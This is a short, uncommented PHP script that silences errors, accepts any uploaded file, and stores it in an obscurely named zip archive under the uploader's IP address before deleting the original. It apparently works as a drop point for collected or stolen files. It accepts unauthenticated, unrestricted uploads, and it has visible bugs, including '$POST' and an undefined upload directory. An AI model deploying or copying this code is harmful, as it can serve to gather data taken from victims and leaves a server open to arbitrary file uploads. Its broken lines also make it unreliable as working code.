<?php
error_reporting(0);

define('zipfile', './logXXX123.zip');

function getMyIP()
{
  $ipaddress = '';
  if (isset($_SERVER['HTTP_CLIENT_IP']))
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
  else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_X_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
  else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
  else if (isset($_SERVER['REMOTE_ADDR']))
    $ipaddress = $_SERVER['REMOTE_ADDR'];
  else
    $ipaddress = 'UNKNOWN';
  return $ipaddress;
}


$id = rawurlencode($_GET['id'] ?? $POST['id'] ?? '');
$id = substr($id,0,25); 
if (is_uploaded_file(isset($_FILES['file']['tmp_name'])?($_FILES['file']['tmp_name']):0)) 
{
$uploadfile = $uploaddir.basename($_FILES['file']['name']);
if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) 
{
$arr = explode(".", $uploadfile);
$id = $arr[0];
$ip = getMyIP();
$zip = new ZipArchive(); 
$zip->open(zipfile, ZIPARCHIVE::CREATE); 
$zip->addFile($uploadfile,$ip."-".$id."/".$uploadfile); 
$zip->close();	
unlink($uploadfile);
}
}
?>
